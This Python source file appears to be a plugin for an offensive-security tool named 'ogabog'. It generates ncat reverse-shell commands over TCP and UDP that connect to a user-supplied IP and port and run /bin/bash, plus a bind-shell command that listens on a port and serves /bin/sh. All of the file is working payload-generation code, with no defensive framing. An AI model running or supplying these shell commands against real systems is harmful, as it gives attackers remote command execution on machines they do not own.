from ogabog.cores import plugin


class ReverseShell(plugin.Module):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--ip",
            help="IP address"
        )
        self.add_args(
            "--port",
            help="Port address"
        )
        self.opts.description = "Generate reverse shell using ncat"
        self.shell = """ncat {} {} -e /bin/bash"""  # TODO add custom option for shell

    def show_shell(self, args):
        print(self.shell.format(args.ip, args.port))


class ReverseShellUDP(plugin.Module):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--ip",
            help="IP address"
        )
        self.add_args(
            "--port",
            help="Port address"
        )
        self.opts.description = "Generate reverse shell using ncat"
        self.shell = """ncat --udp {} {} -e /bin/bash"""  # TODO add custom options for shell

    def show_shell(self, args):
        print(self.shell.format(args.ip, args.port))


class BindShell(plugin.Module):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--port",
            help="Port address"
        )
        self.shell = "ncat -l {} -e /bin/sh"
        self.opts.description = "Generate bind shell using ncat"

    def show_shell(self, args):
        print(self.shell.format(args.port))
